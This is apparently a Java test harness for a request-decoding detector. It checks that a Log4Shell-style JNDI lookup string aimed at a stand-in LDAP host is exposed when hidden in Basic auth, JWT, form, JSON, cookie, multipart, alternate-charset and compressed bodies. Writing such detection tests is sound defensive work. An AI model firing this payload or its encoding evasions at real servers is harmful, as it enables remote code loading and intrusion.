import java.io.ByteArrayOutputStream;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;
import java.util.zip.DeflaterOutputStream;
import java.util.zip.GZIPOutputStream;

public class AppViewsCheck {
    static final String P = "${jndi:ldap://e.invalid/a}";

    static RawHttp.Req req(String ct, byte[] body, String... hdrs) {
        RawHttp.Req r = new RawHttp.Req();
        if (ct != null) r.headers.add(new String[] {"Content-Type", ct});
        for (int i = 0; i < hdrs.length; i += 2) r.headers.add(new String[] {hdrs[i], hdrs[i + 1]});
        r.body = body;
        return r;
    }

    static boolean has(List<String[]> v, String srcPrefix, String value) {
        for (String[] x : v) if (x[0].startsWith(srcPrefix) && x[1].contains(value)) return true;
        return false;
    }

    static void ok(boolean c, String m) {
        if (!c) { System.out.println("FAIL " + m); System.exit(1); }
    }

    static byte[] gz(String s, boolean gzip) throws Exception {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        try (java.io.OutputStream z = gzip ? new GZIPOutputStream(o) : new DeflaterOutputStream(o)) {
            z.write(s.getBytes(StandardCharsets.UTF_8));
        }
        return o.toByteArray();
    }

    public static void main(String[] a) throws Exception {
        String b64 = Base64.getEncoder().encodeToString((P + ":pw").getBytes(StandardCharsets.UTF_8));
        List<String[]> v = AppViews.of(req(null, new byte[0], "Authorization", "Basic " + b64));
        ok(has(v, "basic-decoded", P), "basic: whole decoded credential");
        ok(has(v, "basic-user", "${jndi"), "basic user is split at the first colon, as servers do");
        String plain = Base64.getEncoder().encodeToString("bob:${x}".getBytes(StandardCharsets.UTF_8));
        v = AppViews.of(req(null, new byte[0], "Authorization", "Basic " + plain));
        ok(has(v, "basic-user", "bob") && has(v, "basic-password", "${x}"), "basic user/password");

        String jwtPayload = Base64.getUrlEncoder().withoutPadding().encodeToString(("{\"sub\":\"" + P + "\"}").getBytes(StandardCharsets.UTF_8));
        v = AppViews.of(req(null, new byte[0], "Authorization", "Bearer eyJhbGciOiJub25lIn0." + jwtPayload + ".sig"));
        ok(has(v, "jwt-segment-1", P), "jwt payload");

        v = AppViews.of(req("application/x-www-form-urlencoded", "a=%24%7Bjndi%3Aldap%3A%2F%2Fe.invalid%2Fa%7D&b=2".getBytes(StandardCharsets.UTF_8)));
        ok(has(v, "form:a", P), "form value decoded");

        v = AppViews.of(req("application/json", "{\"u\":\"\\u0024\\u007bjndi:ldap://e.invalid/a}\"}".getBytes(StandardCharsets.UTF_8)));
        ok(has(v, "body.json-unescaped", P), "json unicode escapes");

        for (String cs : new String[] {"UTF-16LE", "UTF-16BE", "UTF-32LE", "IBM037"}) {
            v = AppViews.of(req("text/plain; charset=" + cs, P.getBytes(Charset.forName(cs))));
            ok(has(v, "body.charset:" + cs, P), "declared charset " + cs);
        }
        v = AppViews.of(req("application/json", P.getBytes(Charset.forName("UTF-16LE"))));
        ok(has(v, "body.sniffed:UTF-16LE", P), "sniffed UTF-16LE");
        v = AppViews.of(req("application/json", P.getBytes(Charset.forName("UTF-16BE"))));
        ok(has(v, "body.sniffed:UTF-16BE", P), "sniffed UTF-16BE");

        v = AppViews.of(req("text/plain", gz(P, true), "Content-Encoding", "gzip"));
        ok(has(v, "body.decompressed", P), "gunzip");
        v = AppViews.of(req("text/plain", gz(P, false), "Content-Encoding", "deflate"));
        ok(has(v, "body.decompressed", P), "inflate");

        v = AppViews.of(req(null, new byte[0], "Cookie", "sid=abc; trk=%24%7Bjndi%3Aldap%3A%2F%2Fe.invalid%2Fa%7D"));
        ok(has(v, "cookie:trk", P), "cookie percent-decoded");

        String mp = "--XB\r\nContent-Disposition: form-data; name=\"f\"; filename=\"x.txt\"\r\nContent-Type: text/plain; charset=UTF-16LE\r\n\r\n";
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        bo.write(mp.getBytes(StandardCharsets.ISO_8859_1));
        bo.write(P.getBytes(Charset.forName("UTF-16LE")));
        bo.write("\r\n--XB--\r\n".getBytes(StandardCharsets.ISO_8859_1));
        v = AppViews.of(req("multipart/form-data; boundary=XB", bo.toByteArray()));
        ok(has(v, "multipart:f", P), "multipart part charset");
        ok(has(v, "multipart-filename", "x.txt"), "multipart filename");

        // What a framework does NOT do: none of these may produce a view that exposes the payload.
        v = AppViews.of(req("text/plain", "&#36;&#123;jndi:ldap://e.invalid/a}".getBytes(StandardCharsets.UTF_8)));
        ok(!has(v, "", P), "html entities are not decoded by frameworks");
        v = AppViews.of(req("text/plain", "%2524%257Bjndi:ldap://e.invalid/a%257D".getBytes(StandardCharsets.UTF_8)));
        ok(!has(v, "", P), "double percent is not decoded twice");

        // Garbage must never throw.
        AppViews.of(req("multipart/form-data; boundary=", new byte[] {1, 2, 3}, "Authorization", "Basic !!!", "Cookie", "=="));
        AppViews.of(req("text/plain; charset=nope", "x".getBytes(StandardCharsets.UTF_8), "Content-Encoding", "gzip"));
        ok(AppViews.param("a; Charset=\"utf-8\"", "charset").equals("utf-8"), "param quoted, case-insensitive");
        ok(AppViews.param("a; xcharset=1", "charset") == null, "param needs a word boundary");
        System.out.println("AppViews OK");
    }
}
